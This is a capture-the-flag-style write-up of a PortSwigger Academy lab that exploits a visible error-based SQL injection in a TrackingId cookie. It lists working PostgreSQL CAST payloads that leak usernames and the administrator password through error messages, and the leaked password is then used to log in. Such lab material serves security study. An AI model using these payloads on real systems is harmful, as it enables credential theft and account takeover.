# Visible Error-Based SQL Injection: SOLVED

This lab demonstrated a **visible error-based SQL injection vulnerability** in a tracking cookie.  
The application uses a `TrackingId` cookie for analytics and places its value inside a SQL query.  
Although the results of the SQL query are **not returned**, the application’s **error messages leak internal data**, making extraction possible.

---

## Goal
Extract the **administrator's password** from the `users` table and log in as `administrator`.

---

## Approach

### 1. Captured the request
```http
GET /filter?category=Pets HTTP/1.1
Host: cybernerdddcompany.com
Cookie: TrackingId=ibqb6MmdWlsIshNi; session=ur6tehNIZIBmyhzxsIOny8kmXB1M2CC9
```

### 2. Tested the tracking cookie for SQLi
Injected a single quote `'`:
```html
TrackingId=ibqb6MmdWlsIshNi'
```
The server returned:
```
Unterminated string literal started at position 52 in SQL ...
```
This confirmed **inline SQL injection** because the value broke the query.

### 3. Triggered error messages to leak data
Used a payload that forces PostgreSQL to throw an error trying to cast string data to an integer:
```
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--;
```

#### Why this works
```
`CAST()` converts data types.
```
Casting a string (e.g., administrator) to int causes an error such as:
```
invalid input syntax for type integer: "administrator"
```
This leaks the real data inside the *error* message.

### 4. Removed cookie randomness to see clean SQL errors
Replaced TrackingId with only the payload:
```
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--;
```
**Error returned:**
```
ERROR: more than one row returned by a subquery used as an expression
```
This means the subquery returned multiple usernames.

### 5. Limited the subquery to a single row
```sql
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--;
```
**Response:**
```
ERROR: invalid input syntax for type integer: "administrator"
```
This confirms row 1 = *administrator*.

### 6. Extracted the administrator password
Final payload:
```sql
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--;
```
**Response:**
```sql
ERROR: invalid input syntax for type integer: `"no550cvei33s1g0wogji"`
```
This leaked the administrator password.
//**Results:**
//The password `no550cvei33s1g0wogji` was used to log in successfully as administrator, completing the lab.
*Practice lab from PortSwigger Academy — documented by @cybernerddd*
